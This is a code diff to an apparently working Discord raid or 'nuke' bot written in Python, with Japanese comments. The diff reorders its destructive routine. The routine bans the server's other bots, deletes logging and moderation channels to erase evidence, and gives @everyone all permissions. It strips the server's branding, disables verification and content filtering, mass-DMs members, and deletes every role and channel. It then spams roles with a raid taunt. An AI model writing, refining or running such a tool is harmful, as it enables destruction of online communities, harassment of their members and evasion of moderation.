@@ -77,7 +77,7 @@ async def create_colored_roles_task(guild, target_roles):
     while current < target_roles:
         try:
             await guild.create_role(
-                name=f"ますまに荒らしロール-{current+1}ｗｗｗ",
+                name="ますまに共栄圏に荒らされましたｗｗｗ",
                 color=discord.Color.random(),
                 hoist=True,
                 mentionable=True
@@ -122,75 +122,84 @@ async def core_nuke(guild, new_server_name=None):
 
     print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
 
-    # 並列スタート: 他のボットBAN
+    # 他のボットBAN
     bot_ban_coros = [limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot]
-    bot_ban_task = asyncio.create_task(asyncio.gather(*bot_ban_coros, return_exceptions=True)) if bot_ban_coros else None
+    if bot_ban_coros:
+        await asyncio.gather(*bot_ban_coros, return_exceptions=True)
 
-    # ログ系チャンネル削除
+    # ログ系チャンネル優先削除
     log_keywords = ["log", "ログ", "audit", "監視", "mod", "moderation", "admin", "管理", "report", "報告", "ticket", "チケット"]
     channels = list(guild.channels)
     log_channels = [ch for ch in channels if any(kw.lower() in ch.name.lower() for kw in log_keywords)]
-    log_delete_coros = [limited_global(ch.delete()) for ch in log_channels]
-    log_delete_task = asyncio.create_task(asyncio.gather(*log_delete_coros, return_exceptions=True)) if log_delete_coros else None
+    if log_channels:
+        await asyncio.gather(*(limited_global(ch.delete()) for ch in log_channels), return_exceptions=True)
+        await asyncio.sleep(1)
 
-    # ロール削除タスク
-    roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
-    print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
+    # @everyone権限最大化
+    everyone_role = guild.default_role
+    permissions = discord.Permissions.all()
+    try:
+        await limited_global(everyone_role.edit(permissions=permissions))
+    except:
+        pass
 
-    async def role_deletion_task():
-        async def delete_roles_batch(roles):
-            await asyncio.gather(*(limited_global(r.delete()) for r in roles), return_exceptions=True)
+    # アイコン/バナー/スプラッシュ削除
+    try:
+        await limited_global(guild.edit(icon=None, banner=None, splash=None))
+    except:
+        pass
 
-        batch_size = 15
-        attempt = 0
-        current_roles = roles_to_delete[:]
-        while len(current_roles) > 0 and attempt < 2:
-            attempt += 1
-            for i in range(0, len(current_roles), batch_size):
-                batch = current_roles[i:i+batch_size]
-                await delete_roles_batch(batch)
-                await asyncio.sleep(random.uniform(0.05, 0.1))
+    # 絵文字削除 + スタンプ削除
+    await delete_emojis_and_stickers(guild)
 
-            await asyncio.sleep(1)
-            remaining = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
-            if len(remaining) == 0:
-                break
-            current_roles = remaining
-
-        print(f"ロール削除完了: 残り {len([r for r in await guild.fetch_roles() if not r.is_default() and not r.managed])}個")
-
-    role_task = asyncio.create_task(role_deletion_task())
-
-    # 絵文字/スタンプ削除タスク
-    emoji_sticker_task = asyncio.create_task(delete_emojis_and_stickers(guild))
-
-    # コミュニティ/ウェルカム無効化
+    # コミュニティ無効化
     try:
         await limited_global(guild.edit(
             verification_level=discord.VerificationLevel.none,
             explicit_content_filter=discord.ContentFilter.disabled,
             default_notifications=discord.NotificationLevel.all_messages,
-            community_features=False,
-            system_channel=None,
-            rules_channel=None
+            community_features=False
         ))
     except:
         pass
 
-    # 並列待機
-    if bot_ban_task:
-        await bot_ban_task
-    if log_delete_task:
-        await log_delete_task
-    await emoji_sticker_task
-    await role_task
+    # ウェルカム/ルール無効化
+    try:
+        await limited_global(guild.edit(system_channel=None, rules_channel=None))
+    except:
+        pass
 
     # DM送信
     dm_coros = [limited_dm(send_dm(m)) for m in non_bot_members]
     if dm_coros:
         await asyncio.gather(*dm_coros, return_exceptions=True)
 
-    # チャンネル削除
+    # ロール削除（元のロールのみ）
+    roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
+    print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
+
+    async def delete_roles_batch(roles):
+        await asyncio.gather(*(limited_global(r.delete()) for r in roles), return_exceptions=True)
+
+    batch_size = 15
+    attempt = 0
+    current_roles = roles_to_delete[:]
+    while len(current_roles) > 0 and attempt < 2:
+        attempt += 1
+        for i in range(0, len(current_roles), batch_size):
+            batch = current_roles[i:i+batch_size]
+            await delete_roles_batch(batch)
+            await asyncio.sleep(random.uniform(0.05, 0.1))
+
+        await asyncio.sleep(1)
+        remaining = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
+        if len(remaining) == 0:
+            break
+        current_roles = remaining
+
+    print(f"ロール削除完了: 残り {len(remaining)}個")
+
+    # 残り全チャンネル削除
     channels = list(guild.channels)
     print(f"チャンネル削除開始: 対象 {len(channels)}個")
 
@@ -209,19 +218,11 @@ async def core_nuke(guild, new_server_name=None):
         await asyncio.sleep(0.5)
         channels = list(guild.channels)
 
-    print(f"チャンネル削除完了: 残り {len(guild.channels)}個")
+    print(f"チャンネル削除完了: 残り {len(channels)}個")
 
-    # @everyone権限最大化
-    everyone_role = guild.default_role
-    permissions = discord.Permissions.all()
+    # サーバー名変更
     try:
-        await limited_global(everyone_role.edit(permissions=permissions))
-    except:
-        pass
-
-    # アイコン削除 + 名前変更
-    try:
-        await limited_global(guild.edit(icon=None, banner=None, splash=None, name=new_name))
+        await guild.edit(name=new_name)
     except:
         pass
 
@@ -252,7 +253,7 @@ async def core_nuke(guild, new_server_name=None):
         channels_created += added
         await asyncio.sleep(random.uniform(0.05, 0.1))
 
-    # ロール作成
+    # ロール作成（並列）
     role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))
 
     # スパム + BAN
